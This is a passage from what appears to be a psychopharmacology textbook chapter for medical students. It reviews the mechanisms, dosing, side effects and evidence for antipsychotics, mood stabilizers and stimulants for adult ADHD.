Neuroleptic malignant syndrome (NMS), is a poorly understood, rare, but potentially fatal complication of treatment with FGAs and other antipsychotics.  NMS is characterized by a constellation of symptoms which may include delirium, lead-pipe rigidity, autonomic instability and high fevers.  It can develop very early in the course of antipsychotic treatment.  A high serum creatine phosphokinase (CPK) and elevated white blood cell count are supportive of the diagnosis of NMS.  If NMS appears likely then the offending antipsychotic should be immediately discontinued.  Medical hospitalization is necessary and treatment may include the use of a dopamine agonist (e.g., bromocriptine), a muscle relaxant (e.g., dantrolene), aggressive hydration, and the use of benzodiazepines if needed for behavioral agitation.(Hu and Frucht, 2007)  Once the patient has been medically stabilized, the offending agent should be avoided.  Rechallenge may be possible two weeks after all symptoms of NMS have abated, optimally with a low potency antipsychotic.

===Second Generation Antipsychotics (SGAs)===
	
Second generation antipsychotics, also known as atypical antipsychotics, are believed to exert their antipsychotic effects through a similar mechanism of action, but have profiles of receptor activity that produce different side effects than FGAs.  The first SGA to be developed was clozapine, which was followed by the sequential introduction of risperidone, olanzapine, quetiapine, ziprasidone, and aripiprazole in the U.S. (and amisulpride and zotepine among others, in other countries).   Whereas FGAs were known to (1) possibly worsen (or at least not improve) the negative symptoms of schizophrenia and (2) cause extrapyramidal symptoms including TD,  SGAs were hoped to be more effective in treating negative symptoms and less likely to cause movement disorders.  It is true that, by and large, SGAs do not worsen negative symptoms of schizophrenia and have a much lower risk of causing TD.(Correll, Leucht et al. 2004)  However, questions regarding the differential effectiveness of SGAs as compared with FGAs, and their greater risks of inducing other, non-neurological, adverse effects have served to dampen the optimistic expectations initially associated with the medications.  Nevertheless, in most of the world where they are available, SGAs are still considered to be the first line for treatment of psychotic disorders.
	
Risperidone, one of the earliest SGAs to be developed, was released in 1994.  It is similar to FGAs in that it is a potent D2 receptor antagonist, but like many other SGAs, it is also a post-synaptic serotonin 5HT2A antagonist.  This is thought to mitigate the D2 receptor-mediated neurological side effects.  At doses lower than 6 mg/day (i.e., at usual therapeutic doses), risperidone carries a low risk of causing EPS; at higher doses,  D2 blockade effects predominate and the risk of EPS increases significantly.  EPS are usually not present at risperidone 3 mg/day—a dose at which 72% of D2 receptors are occupied.(Nyberg, Eriksson et al. 1999)  The optimal dose derived from clinical studies appears to be 3-6 mg daily.(Osser and Sigadel, 2001)  Although generally a well-tolerated antipsychotic, the side effects of risperidone include possible hypotension and hyperprolactinemia, and in children and adolescents it produces considerable weight gain.(Sikich, Frazier et al. 2008)  It is a hepatic CYP2D6 enzyme substrate and therefore its metabolism can be slowed by (1) inhibitors such as fluoxetine and paroxetine,(Spina, Scordo et al. 2003) or (2) the CYP2D6 variant gene for slow metabolism, which results in a less active form of the CYP2D6 enzyme (found more often in Chinese and other East Asian individuals).(Bertilsson, 1995)  Another gene variant that causes &quot;poor&quot; metabolism is more common in Caucasians and results in severe side effects.  On the positive side, risperidone has a low to medium propensity to cause adverse metabolic effects in adults (see discussion below).  It may also have a somewhat more rapid onset of action compared to other second generation antipsychotics.(Osser and Sigadel, 2001)  The newly introduced (and therefore more costly) paliperidone, which is the major active metabolite of risperidone with similar efficacy and similar side effect profile, is not metabolized by CYP2D6 and is mostly renally excreted.
	
Olanzapine was introduced in 1996. It has less affinity for D2 receptors than risperidone and a greater affinity for 5HT2A and 5HT2C serotonin receptors.  Olanzapine also has significant antihistaminic and anticholinergic effects.  Although it is an effective antipsychotic for the treatment of schizophrenia (especially at doses equal or greater than 15 mg/day),(Osser and Sigadel, 2001) it is (along with clozapine as discussed below) associated with a high risk of developing weight gain, insulin resistance, and hyperlipidemia (i.e., &quot;metabolic syndrome&quot;).  Concern about the increased morbidity and mortality associated with the metabolic syndrome has lead to a reduction of the use of olanzapine in recent years.  All side effects increase when olanzapine is used at higher than recommended doses (e.g., 40 mg/day vs. the package insert maximum dose of 20 mg/day) with very little additional antipsychotic benefit.(Kinon, Volavka et al. 2008)  Liver transaminases can also become transiently elevated with olanzapine.
	
Quetiapine shows weak affinity at both dopamine and 5HT2 serotonin receptors, but may have similar receptor occupancy to the more potent SGAs.(Seeman, 2002)  It has alpha-adrenergic antagonism and antihistaminic effects, causing orthostasis and sedation, respectively.  Quetiapine is less likely than olanzapine and clozapine, but more likely than most FGAs, risperidone and other SGAs, to cause metabolic side effects.  Quetiapine, at low doses, is widely (and perhaps too readily) used in psychiatric practice for the treatment of insomnia and acute anxiety in a wide range of patients with personality and/or substance abuse disorders for whom benzodiazepine use may be problematic.  This &quot;off-label&quot; use should only be carried out after a thoughtful review of risks, benefits, and alternative treatments, especially evidence-supported treatments, for patients' diagnosed conditions.  Clinicians should be aware also of recent reports of abuse and &quot;street value&quot; for this medication.(Hanley and Kenna, 2008)  Use of quetiapine for anxiety symptoms may be more appropriate in acute care settings such as during hospitalizations.  Quetiapine’s effectiveness in psychotic disorders may be less than that of olanzapine and risperidone,(McCue, Waheed et al. 2006; Suzuki, Uchida et al. 2007) but it may have a stronger role in bipolar disorders (see section on mood stabilizers).
	
Ziprasidone is an SGA with moderate D2 antagonism and significant 5HT2A antagonism (i.e., a high 5HT2A/D2 ratio).  Although it is not clear if it is as effective as olanzapine and risperidone in the acute treatment of schizophrenia,(McCue, Waheed et al. 2006) it does not cause metabolic changes, and may even improve lipid profile, especially if the patient was previously on a weight gain-inducing agent.(Lieberman, Stroup et al. 2005)  A major issue with using ziprasidone is the necessity of taking it with food, or it will not be well-absorbed.  A 500 calorie meal is optimal with each of the twice daily doses.(Miceli, Glue et al. 2007)
	
Ziprasidone has the potential to prolong QT more than other SGAs.  Although a pre-treatment ECG is not required, those who are deemed, based on history or age, to be at higher cardiac risk would benefit from an ECG (and medical consultation if appropriate) before starting ziprasidone.  Electrolyte disturbances such as hypomagnesemia and hypokalemia should be corrected.  Other QT prolonging medications should not be used in combination with ziprasidone.  Despite concerns regarding this effect, post-marketing studies (e.g., CATIE)(Lieberman, Stroup et al. 2005) did not show any clinically significant QT prolongation with ziprasidone use.
	
Medical students and physicians should be aware that all antipsychotics (with the possible exception of aripiprazole discussed below) can affect cardiac conduction, potentially delaying conduction enough to lead to fatal arrhythmias.  There is an association between the use of antipsychotics (as well as tricyclic antidepressants) and sudden death.(Ray, Chung et al. 2009; Ray, Meredith et al. 2004; Straus, Bleumink et al. 2004)  As discussed in the section on antidepressants, prolonged QTc is associated with torsades de pointes, a potentially fatal arrhythmia.  The QT interval includes both the QRS interval as well as the ST segment.  Whereas TCAs and some FGAs with tricyclic structure (e.g., chlorpromazine) lengthen the QRS interval by interfering with sodium channels and depolarization, most other antipsychotics, including SGAs, can affect potassium channels and the repolarization phase.(Glassman and Bigger, 2001)  Both effects would be reflected in the QT interval.  Although it is not clear if QT prolongation is actually a reliable indicator of the risk of torsades, measuring this interval is the simplest way to estimate this risk.(Shah, 2005)  In addition to ziprasidone, the FGAs thioridazine, mesoridazine, pimozide, and droperidol are among the antipsychotics with the highest propensity to prolong the QT interval.(Fayek, Kingsbury et al. 2001)
	
Aripiprazole, in contrast to other SGAs, is a high affinity partial agonist at the D2 receptor.(Mamo, Graff et al. 2007)  It is postulated that aripiprazole decreases overall dopamine effect(Stahl, 2008) in dopamine rich environments (e.g., in mesolimbic pathways--thereby ameliorating psychosis), and increases dopamine effect in dopamine depleted environments (e.g., in mesocortical pathways to the prefrontal cortex--thereby improving negative symptoms such as social withdrawal).(Stahl, 2008)  At therapeutic doses it highly saturates the targeted dopamine receptors and shows very slow dissociation from the receptors upon discontinuation.(Goff, 2008; Grunder, Fellows et al. 2008)  It also shows moderate 5HT2A and 5HT2C antagonism.  On the other hand, it is free from anticholinergic and significant antihistaminic effects.  More importantly, it does not appear to have significant cardiac or metabolic effects.(El-Sayeh, Morganti et al. 2006)  Although it is less likely to cause EPS in general, it has been observed in practice to cause akathisia more readily than other SGAs.  This side effect may be more common if the patient was recently on a strong D2 antagonist such as an FGA or risperidone and consequently has an up-regulated or hypersensitive population of D2 receptors.(Raja, 2007)  Slow dose titration and/or combination with a benzodiazepine may be necessary to reduce the risk of akathisia.
	
Aripiprazole at 15 mg/day may be more efficacious than 30 mg/day in schizophrenia, although full response may take longer than with a comparable dose of haloperidol.(Kane, Carson et al. 2002)  Higher doses (e.g., 30 mg/day) may be more useful in treatment-resistant schizophrenia.(Kane, Meltzer et al. 2007)  Relapse rates may be somewhat higher with aripiprazole than with other SGAs.(Pigott, Carson et al. 2003)
	
Clozapine, the first and in some respects the most impressive of the second generation antipsychotics, binds weakly at the D2 receptor (although with relatively greater net antagonism at D3 and D4 dopamine receptors) and has moderate affinity for 5HT2A and 5HT2C receptors.  It is often effective when other antipsychotics are not,(Lewis, Barnes et al. 2006) and appears to have antisuicidal effects in patients with schizophrenia or schizoaffective disorder.(Meltzer, Alphs et al. 2003)  However, because of the risk of agranulocytosis, it is reserved primarily for schizophrenic and schizoaffective patients who have failed to respond adequately to at least two other antipsychotics.  Strict monitoring and initially weekly and then biweekly blood draws are required to monitor white cell count.  The clinician should consult the package insert and strictly follow the monitoring guidelines. Clozapine should not be combined with other medications (e.g., carbamazepine) that may also cause leukopenia.
	
Clozapine can also cause multiple other adverse effects, which include (but are not limited to) an increased risk of seizures, rare myocarditis, eosinophilia, anticholinergic and antihistaminic effects, orthostasis, weight gain and adverse metabolic effects.(Lamberti, Olson et al. 2006)
	
Among the SGAs, clozapine and olanzapine are the most likely (and aripiprazole and ziprasidone are the least likely) to cause adverse metabolic effects.  These would include weight gain, hyperglycemia and diabetes (with or without weight gain) and hyperlipidemia.(ADA, 2004)  A 2-3 kilogram weight gain within the first 3 weeks of treatment often predicts the risk of significant weight gain over the long term.(Lipkovich, Citrome et al. 2006)  Decreased insulin secretion and increased triglycerides (i.e., the lipids most affected by SGAs)(Osser, Najarian et al. 1999) can also be seen within 1-2 weeks of treatment.(Chiu, Chen et al. 2006)  Treatment with the hypoglycemic medication metformin, especially if combined with lifestyle changes, may reduce antipsychotic-induced weight gain.(Baptista, Rangel et al. 2007; Wu, Zhao et al. 2008)
	
Prior to starting olanzapine or clozapine, measurements of baseline weight, serum glucose, and lipid profile should be obtained.  If the patient has pre-existing diabetes, other antispychotics should be considered.  Once treatment is initiated, serum glucose and weight should be monitored and if glucose levels become elevated, a glucose tolerance test—which can predict up to 96% of patients who would develop diabetes—should be done.(van Winkel, De Hert et al. 2006)  If metabolic problems do arise during treatment, switching to another antipsychotic should be considered.
	
Clozapine may cause orthostatic hypotension.  Patients who are elderly, have cardiac histories, or who are taking antihypertensives are at higher risk for this side effect.  Clozapine should be increased gradually after treatment is initiated (starting at 12.5 mg/day and increasing the dose by 25 mg daily as tolerated).  Usually, patients adjust and become tolerant to the hypotensive effects of this medication.  However, this tolerance may not last longer than 48 hours.  If a patient discontinues clozapine therapy for more than 48 hours, treatment should be restarted with a 12.5 mg dose.  After that, the dose may be more quickly raised to the previous dose as tolerated.  It is important for the physician who may be admitting a psychiatric patient to the medical or surgical ward of the hospital to stop and think before continuing clozapine at its prior dose: recent compliance needs to be verified first.
	
Given the complicated nature of clozapine treatment, the clinician should refer to a more in depth discussion of this drug before use.(Phansalkar and Osser, 2009; Phansalkar and Osser. 2009)

===Long-Acting Injectable Antipsychotics===
	
In the United States, 3 antipsychotics are available for long-acting (i.e., depot) intramuscular administration: haloperidol decanoate, fluphenazine decanoate, and long-acting injectable risperidone.  Olanzapine long-acting injection is expected to be approved soon.  These long-acting formulations are options for patients who are frequently non-adherent to the prescribed oral medication.(Olfson, Marcus et al. 2007)  A brief trial of the antipsychotic in oral form is first prescribed to assess patients' response to, and tolerance of, the selected agent.  Every four week injections of haloperidol decanoate or biweekly injections of long-acting fluphenazine or risperidone are then continued while the oral agent is gradually tapered.   Four to five repeated injection cycles of the selected antipsychotic may be necessary to achieve steady state before oral medications should be completely withdrawn.(Osser and Sigadel ,2001)  Patients who adhere poorly to oral medications in real-world public sector settings are generally non-adherent to depot antipsychotics as well.(Olfson, Marcus et al. 2007)  These formulations seem to work best in research subjects and in other populations of relatively cooperative and less treatment-resistant patients.  On the other hand, once steady state is achieved, depots do have the advantage that if the patient discontinues treatment, the antipsychotic effect can continue for up to several months after the last received dose.

===Antipsychotics for Behavioral Control===
	
Both SGAs and FGAs are used in psychiatric practice to treat behavioral agitation.  In acutely psychotic and/or manic patients, FGAs, such as oral or intramuscular haloperidol (often combined with lorazepam and/or benztropine to decrease the risk of acute dystonias), remain the mainstay of treatment.(Ansari, Osser et al. 2009, Osser and Sigadel, 2001)  Newer antipsychotics, such as olanzapine, ziprasidone, and aripiprazole are also available in short-acting intramuscular form but they are expensive and seem to have no advantage when compared with the combination therapy noted above.(Satterthwaite, Wolf et al. 2008)  When considering antipsychotics for behavioral agitation, clinicians should be advised not to use (1) intramuscular droperidol due to high risk of QT prolongation, (2) intramuscular chlorpromazine due to risk of severe hypotension, (3) intramuscular ziprasidone if the patient is taking other medications that can also prolong QT, or (4) intramuscular olanzapine in combination with lorazepam or other benzodiazepines due to the risk of hypotension.(Zacher and Roche-Desilets, 2005)
	
The use of antipsychotics for the treatment of behavioral agitation in elderly patients with dementia is problematic both in terms of effectiveness and tolerability. 
First, in terms of effect, they do not appear to provide more than minimal benefit in targeting symptoms of agitation, and SGAs may not be different from placebo in this regard.(Yury and Fisher, 2007)  The NIMH-sponsored CATIE-AD study, which studied the effectiveness of olanzapine, quetiapine and risperidone in the treatment of symptoms of psychosis, aggression and agitation in patients with Alzheimer's disease, also found that even when these symptoms did improve with treatment, the antipsychotic did not improve overall functioning.(Sultzer, Davis et al. 2008)  Furthermore, any improvement in specific symptoms was offset by adverse effects and led to overall discontinuation rates (when both efficacy and tolerability were considered) that were no different from placebo.(Schneider, Tariot et al. 2006)  Secondly, antipsychotics have been found to be associated with an increased risk of stroke in patients with dementia and an overall increased risk of adverse medical events and death in this population.(Gill, Rochon et al. 2005; Herrmann and Lanctot, 2005; Rochon, Normand et al. 2008; Schneider, Dagerman et al. 2005)  Both FGAs and SGAs appear to increase the risk of death in patients with dementia.(Schneeweiss, Setoguchi et al. 2007; Wang, Schneeweiss et al. 2005)
	
High-potency FGAs are also often used in the treatment of delirium in hospitalized patients.(Lonergan, Britton et al. 2007)  Medical students and physicians should be aware that although antipsychotics may treat the secondary manifestations of delirium, such as behavioral agitation and/or hallucinations, they do not treat the underlying condition.  Delirium is a medical condition that is treated by addressing the underlying medical cause.

===Further Notes on the Clinical Use of Antipsychotics===
	
All antipsychotics are indicated for the treatment of schizophrenia and are considered reasonably safe and effective for this debilitating disorder.  However, there has been much debate about whether there are efficacy differences among these medications, or whether the side effect differences, which are considerable, should be the primary basis for selecting a medication for a particular patient.  A meta-analysis of 78 head-to-head comparisons in the literature through 2007 concluded that the efficacy differences are small, but there was some superiority to olanzapine and risperidone, when compared with aripiprazole, quetiapine, and ziprasidone.  A problem with this meta-analysis, however, was that almost all of the studies were industry-sponsored.  Such studies invariably find outcomes in favor of the sponsor’s product, and olanzapine and risperidone have sponsored the largest number of studies.
	
Another meta-analysis focused on 150 studies that directly compared FGAs with SGAs.(Leucht, Corves et al. 2009)  The authors found that clozapine was clearly superior to the others especially for positive symptoms of hallucinations and delusions.  Olanzapine and risperidone were superior to the others, but with a small effect size.  The others did not differ in efficacy.  The side effect profiles differed markedly, with no pattern to the differences.  The authors recommended abandoning the terms &quot;FGA&quot; and &quot;SGA&quot; as irrelevant to efficacy or side effects.

Many clinicians put more reliance on the relatively few comparison studies that were independently funded, such as the CATIE (Clinical Antipsychotics Trials of Intervention Effectiveness) and TEOSS (Treatment of Early-Onset Schizophrenia Spectrum Disorders) studies.(Lieberman, Stroup et al. 2005; Sikich, Frazier et al. 2008)  Both were funded by the U.S. National Institute of Mental Health.  These studies prospectively compared FGAs (perphenazine, molindone) and SGAs (clozapine, olanzapine, risperidone, quetiapine, ziprasidone) and found generally no differences in effectiveness except that clozapine was superior.  There were no differences in the ability to improve impaired cognition, despite prior claims for SGA superiority from studies sponsored by the SGA pharmaceutical firms.(Keefe, Bilder et al. 2007)
      
Some experts have interpreted CATIE as showing olanzapine to be superior to the other non-clozapine antipsychotics, but this seems likely to be due to peculiar results with the cohort of patients who were on olanzapine prior to entering the CATIE study.  These patients (22% of the sample) were randomly assigned to either continue on olanzapine or be switched to one of the other options in CATIE (perphenazine, risperidone, quetiapine, or ziprasidone).  The patients who were assigned to remain on olanzapine did better than those who were abruptly switched to any of the other options.(Essock, Covell et al. 2006)  By contrast, the patients who entered the study on risperidone (the second largest group with 19%) showed no advantage to staying on risperidone compared to switching to another agent.  Notably, there was no advantage to switching to olanzapine.  Hence, the superiority of olanzapine seen in CATIE may be due to the study having a large sample of patients who had been previously stabilized on olanzapine and who clearly responded only to olanzapine or who may have been more prone to a withdrawal-induced exacerbation when taken off of olanzapine.  Since olanzapine has a very unfavorable side effect profile with its tendency to promote weight gain, insulin resistance, and the metabolic syndrome, this would appear to make it undesirable as a first-line choice even if it does have slightly superior efficacy.
	
Antipsychotics are also being used in a wide variety of mood and anxiety disorders as augmentations when antidepressants produce unsatisfactory results, and sometimes they are used as primary treatments for these disorders.  Recent data indicating that SGAs and FGAs are associated with double to triple the rate of death from sudden cardiac arrest (presumably from electrophysiological effects related to QT prolongation) suggest that these agents should not be first-line treatments in these clinical situations.(Ray, Chung et al. 2009)  However, antipsychotics are powerful and important options in the treatment of schizophrenia and severe bipolar disorders and these new cardiac concerns should not deter clinicians for prescribing them appropriately for these patients.  Obtaining a baseline ECG, and if abnormal obtaining another after dosage has been optimized, is a prudent risk-management approach given this new data.

== Mood Stabilizers ==
	
What is a mood stabilizer?  Although there is no generally accepted definition, a mood stabilizer can be defined as a medication that can treat either phase of bipolar disorder while not inducing or worsening the other phase.  More conservatively, however, a mood stabilizer can be defined as an agent that can both treat and prevent both manic and depressive episodes.  By this definition only lithium qualifies as a true mood stabilizer.(Bauer and Mitchner, 2004)
	
Lithium (as a salt) has been used as a homeopathic treatment for gout and other disorders since the 1800’s.  Its calming effect on animals, and subsequently on manic patients, was first described in the 1940s.(Cade, 1949)  In the brain, lithium inhibits inositol phosphatases that dephosphorylate inositol phosphates that are generated by the stimulation of G proteins in neuronal membranes activated by a neurotransmitter.  This inhibition interferes with inositol regeneration and leads to its depletion in neurons, ultimately leading to decreased neuronal activity.(Nestler, Hyman et al. 2009)  Lithium also inhibits protein kinases, glycogen synthase kinase-3beta, and adenylyl cyclase,(Bachmann, Schloesser et al. 2005; Lenox and Hahn 2000) and may increase the uptake of the excitatory neurotransmitter glutamate thereby reducing glutamate activity at the neuronal synapse.(Shaldubina, Agam et al. 2001)  Lithium also appears to have neuroprotective properties and may promote neurogenesis.(Chuang, 2005; Chen and Manji, 2006; Bearden, Thompson et al. 2007; Nunes, Forlenza et al. 2007; Fornai, Longone et al. 2008)
	
Lithium is effective in both manic and depressive episodes associated with bipolar disorder, as well as for long-term maintenance.  It is also the only mood stabilizer with anti-suicidal effect.(Baldessarini, Tondo et al. 1999; Cipriani, Pretty et al. 2005)  Lithium works particularly well in patients who have a strong family history of bipolar disorder.(Alda, 1999)
	
A target therapeutic serum level of 0.6-0.75mEq/L is recommended for the treatment of bipolar depression and prophylaxis against depressive relapses.(Kleindienst, Severus et al. 2007; Kleindienst, Severus et al. 2005; Severus, Kleindienst et al. 2008)  Serum levels of 0.75-1.2mEQ/L may be more effective for the treatment of mania.  Serum levels higher than 1.2mEq/L are associated with significant lithium toxicity.
	
Lithium side effects usually increase with higher serum doses but can occur at any dose.  These may include nausea, vomiting, diarrhea, tremor, thirst, polyuria, acne, weight gain, and a benign leukocytosis.  Over the long run, lithium can cause hypothyroidism in up to 20% of patients(Johnston and Eagles 1999) (which can be treated with thyroid hormone replacement), and worsening renal function in 20% of patients (Lepkifker, Sverdlik et al. 2004) (which usually necessitates lithium discontinuation).  Because of the many complexities of lithium use, access to references such as the Lithium Encyclopedia for Clinical Practice is recommended.(Jefferson, Greist et al. 1987)
	
Physicians should be aware that the anti-manic effects of lithium (and other mood stabilizers, such as valproate and carbamazepine, discussed below) may not be achieved until 7-10 days after a therapeutic dose has been established.  In the interim, sedative medications such as antipsychotics and benzodiazepines may be needed when the patient is acutely manic.  Once the patient is stabilized, these adjunctive medications can often be tapered and lithium continued as monotherapy.
	
Valproate (along with carbamazepine and lamotrigine discussed below) is an anticonvulsant with mood stabilizing properties.  It is postulated that it exerts its effect via enhancement of GABA transmission.(Johannessen, 2000)  Despite decades of clinical experience with lithium, valproate has become the most widely used mood stabilizer in the United States.  This is primarily due to its ease of use and effectiveness in the treatment of mania.  Valproate is not very effective in the treatment of bipolar depression, but has efficacy in the treatment of manic and mixed episodes (Bowden, Brugger et al. 1994; Freeman, Clothier et al. 1992)  Although serum levels of 50-125 mcg/mL are generally considered to be within the therapeutic range (a range based on anticonvulsant data), the best results in acute mania may occur with levels of greater than 90 mcg/mL.(Allen, Hirschfeld et al. 2006)  Side effects in adults include liver enzyme elevations (usually benign and transient, but not always), weight gain, and possible thrombocytopenia and platelet dysfunction.  Because of the latter, bleeding time should be measured prior to surgery even if the platelet count is normal.(De Berardis, Campanella et al. 2003; Gerstner, Teich et al. 2006)  Valproate is highly protein-bound: concurrent use with warfarin can displace and increase the free fraction of warfarin and increase prothrombin time.
	
The use of valproate is problematic in women of child bearing age.  It is associated with a high risk of teratogenic effects (i.e., neural tube defects).(Cohen, 2007; Viguera, Koukopoulos et al. 2007)  Valproate may also play a role in the development of polycystic ovary syndrome.(Joffe, Cohen et al. 2006; O'Donovan, Kusumakar et al. 2002)  
	
Many clinicians recommend the use of alternative medications, such as lithium in young bipolar women.  Lithium can cause Ebstein's anomaly, an anomaly in the fetal tricuspid valve, at up to 3 times the baseline risk.  Previously, this risk was thought to be much higher.  For a more complete discussion of pregnancy risks of psychiatric medications, see the 2008 Practice Bulletin of the American College of Obstetrics and Gynecology.(ACOG, 2008)
	
Carbamazepine is an anticonvulsant that can enhance Na+ channel inactivation, thereby blocking action potentials and repetitive neuronal firing.  It is also thought to inhibit a process known as kindling—a process whereby repeated subthreshold electrical stimuli can lead to the development of spontaneous seizures.  Hypothetically, subthreshold environmental stimuli or prior manias can similarly kindle the development and frequency of further manias.(Rosenbaum, Arana et al. 2005)
	
Carbamazepine has efficacy in the treatment of manic (Weisler, Kalali et al. 2004; Weisler, Keck et al. 2005), but probably not depressive,(Ansari and Osser, 2009) episodes associated with bipolar disorder.  Serum levels of 4-12 mcg/mL are considered to be therapeutic.  Side effects such as dizziness, ataxia and gastrointestinal symptoms prohibit the use of loading strategies.  Thrombocytopenia, leukopenia, hyponatremia, and dangerous rash may also develop with carbamazepine therapy.  Another factor that significantly limits treatment with carbamazepine, especially in severe mania when concurrent antipsychotics may be necessary, is its propensity to induce multiple hepatic enzymes (e.g., CYP1A2, CYP2C9, CYP2C19, CYP3A4).  It can therefore increase the metabolism of other concurrently administered drugs and render them less effective.  (Notably, the antiepileptic drugs phenobarbital, phenytoin, and primidone also have similarly broad hepatic enzyme induction capacities.)(Perucca 2006)  Teratogenic effects of carbamazepine are comparable in severity to those of valproate.(Cohen, 2007; Viguera, Koukopoulos et al. 2007)
	
Oxcarbazepine, an analog of carbamazepine, may also have efficacy in the treatment of acute mania.(Ghaemi, Berv et al. 2003; Pratoomsri, Yatham et al. 2006)  Serum levels do not need to be checked, and there is less enzyme induction with oxcarbazepine, thereby reducing the risk of drug-drug interactions.  Hyponatremia, however, remains a concern.(Ortenzi, Paggi et al. 2008) 
	
Lamotrigine is an anticonvulsant that may inhibit the release of the excitatory amino acid glutamate, but its mechanism of action is not fully known.  In bipolar disorder it is often used (but not FDA approved) for the treatment of bipolar depression.  However, 4 out of 5 studies failed to show separation from placebo.(Calabrese, Bowden et al. 1999; Calabrese, Huffman et al. 2008)  Nevertheless, it appears to be effective as maintenance therapy for depressive episodes in bipolar disorder.(Bowden, Calabrese et al. 2003; Calabrese, Bowden et al. 2003)  Although lamotrigine is generally well-tolerated, there is a 0.1% risk of dangerous rash (i.e., toxic epidermal necrolysis—Stevens-Johnson syndrome).  Gradual titration is required to decrease the risk of rash.  If rash develops, lamotrigine should be discontinued.  Lamotrigine so far seems relatively safe in pregnancy.(ACOG, 2008)

===Second Generation Antipsychotics===
	
All SGAs have been found to have efficacy in the treatment of mania.(Janicak, 2006)  However, among the SGAs, only quetiapine has been shown to have clear efficacy in the treatment of bipolar depression.(Calabrese, Keck et al. 2005; Thase, Macfadden et al. 2006)  Olanzapine and aripiprazole have been found effective, as monotherapy treatments, for prevention of manic episodes, and quetiapine has unpublished data suggesting it may prevent both manic and depressive episodes.  It may soon present a challenge to lithium as the mood stabilizer with the best evidence base.  This remains to be seen.
	
There is evidence that the SGAs olanzapine, quetiapine, ziprasidone, and aripiprazole, when added to lithium or valproate, can increase maintenance efficacy for the manic phase.  In the case of quetiapine, the depressive phase was also helped.

===Newer Anticonvulsants===
	
Newer anticonvulsants such as topiramate, gabapentin, pregabalin, tiagabine, zonisamide and levetiracetam, which are generally thought to exert their therapeutic effects by enhancing GABA transmission, may also be effective for the treatment of bipolar disorder.(Johannessen and Landmark, 2008)  However, when used, they should be considered to be adjunctive treatments only (e.g., to decrease concurrent anxiety); the evidence base is insufficient to recommend their use as primary agents for the treatment of mood disorder symptoms.(Anand, Bukhari et al. 2005; Grunze, Langosch et al. 2003; Grunze, Normann et al. 2001; Keck, Strawn et al. 2006; Macdonald and Young, 2002; Pande, Crockatt et al. 2000; Vieta, Goikolea et al. 2003; Vieta, Manuel Goikolea et al. 2006; Vieta, Sanchez-Moreno et al. 2003; Yatham, Kusumakar et al. 2002; Young, Geddes et al. 2006; Young, Geddes et al. 2006)

Further Notes on the Clinical Approach to Bipolar Patients
	
Mood stabilization is frequently difficult to achieve in bipolar disorder.  Although the goal is to use as few medications as possible and rely on mood stabilizers whenever possible, it is common that more complex psychopharmacology regimens are required.  The American Psychiatric Association's recently released updated Practice Guidelines for the Treatment of Bipolar Disorder contains a comprehensive review of the current knowledge base on the psychopharmacology of this disorder.(APA, 2009)
	
The Systematic Treatment Enhancement Program – Bipolar Disorder (STEP-BD) is a publically funded project designed to add to our understanding of how to best treat this disorder.  The program enrolled 4,360 bipolar patients who are being followed longitudinally at 15 sites.  Some of these patients agree to enter controlled studies of a variety of psychosocial and psychopharmacological interventions.  Among the significant findings to date are the following:
* Psychotherapy is effective for bipolar depression but it is a slow process.  It takes 169 days vs. 279 days in the control group.(Miklowitz, Otto et al. 2007)
* Antidepressants (bupropion, paroxetine) are not more effective than placebo for bipolar depression (24% for the antidepressants vs. 27% for the placebo in a 6-month trial).  The antidepressants did not induce more switches to mania (10% vs. 11%), but the patients who participated in this study were probably at very low risk for switching.(Sachs, Nierenberg et al. 2007)
* Other STEP-BD data did show that use of antidepressants was associated with more manic symptoms.(Goldberg, Perlis et al. 2007)
* 262 suicide attempts and 8 completed suicides have occurred in this patient sample over a 6-year period.  Lithium seemed to offer no protective effect, contrary to data from other studies strongly suggesting that lithium helps lower suicide risk in bipolar patients.  However, the patient sample clearly had a very low risk of suicidal behaviors so it was not the best population to demonstrate lithium’s possible benefit on this symptom.(Marangell, Dennehy et al. 2008)

== Stimulants and Other ADHD Medicines ==

The use of psychotropics for the treatment of attention-deficit/hyperactivity disorder (ADHD) in children and adolescents is beyond the scope of this chapter.  In adults, the diagnosis of ADHD is controversial but guidelines have been developed.(Gibbins and Weiss, 2007)  Diagnosis of adult ADHD is predicated on plausible historical evidence of childhood onset.(APA, DSM, 2000)  This is often difficult to establish retrospectively, and when earlier ADHD symptoms are suspected, it is difficult to rule out other etiologies for these symptoms (e.g., family stressors, childhood depression, learning disorders, etc.).  Nevertheless, there are adults with undiagnosed ADHD, many of whom have other comorbid psychiatric illnesses, who continue to suffer chronic symptoms through adulthood and may benefit from treatment.  Others may have had a clear history and diagnosis of ADHD in childhood and as adults may need to have pharmacological treatments considered or resumed.

===Stimulants===
	
Stimulants are the most effective and the first-line treatment for non-substance-abusing patients with ADHD.  Amphetamine-like stimulants are sympathomimetic amines that likely enhance norepinephrine and dopaminergic transmission.  They may disrupt the presynaptic storage of these transmitters and enhance their release—in both the ascending reticular activating system as well as in the regulation of &quot;top-down&quot; cortical-thalamic-striatal circuits.(Nestler, Hyman et al. 2009)  Methylphenidate, dextroamphetamine and amphetamine salts are examples of psychostimulants used in the treatment of ADHD.   Assuming correct diagnosis and adequate dose, stimulants' beneficial effects on attentional symptoms, impulsivity and hyperactivity are immediate and subside with medication clearance.  Short half-life formulations need to be administered multiple times during the day, but not near bedtime.  Stimulant side effects include decreased appetite, insomnia, and anxiety, necessitating gradual dose titration to improve tolerability.  Blood pressure and heart rate can also increase with stimulant administration so patients with cardiac disease may not be good candidates for treatment with stimulants.  Possible growth retardation and the development of transient tics, although of concern in children, are not likely to be problematic in adults.  Chronic stimulant use (or overdose) can lead to psychosis; in susceptible individuals, increased psychosis can be seen after just one dose.(Curran, Byrappa et al. 2004)  Medication interactions of note include that stimulants should not be combined with MAOIs.
	
The major concern regarding the use of stimulants, however, is the risk of abuse and dependence.  This seems related to the stimulants' ability to increase dopaminergic effects in the reward and reinforcement circuitry in the nucleus accumbens.  Euphoria, tolerance, and addictive behaviors may develop in susceptible individuals.  In the United States, therefore, amphetamine-like stimulants are highly regulated; they are &quot;Schedule II drugs&quot;-- which indicates that the Drug Enforcement Administration (DEA) designates them as being in the highest risk category for controlled substances that have an established therapeutic use.  The risks of addiction and misuse have led some clinicians to be wary of using stimulants even when treatment with these medications is otherwise medically indicated.  However, if the diagnosis of ADHD is accurate, these medications should not be avoided in patients who do not have a history of substance abuse.  A clear risk and benefit assessment is necessary.  Appropriate monitoring and supervision may decrease the risk of abuse.  Recent data suggest no increase in risk of subsequent abuse of stimulants when children and adolescents with ADHD are treated with stimulants.(Biederman, Monuteaux et al. 2008)  Notably, there was no decrease in risk either, i.e., 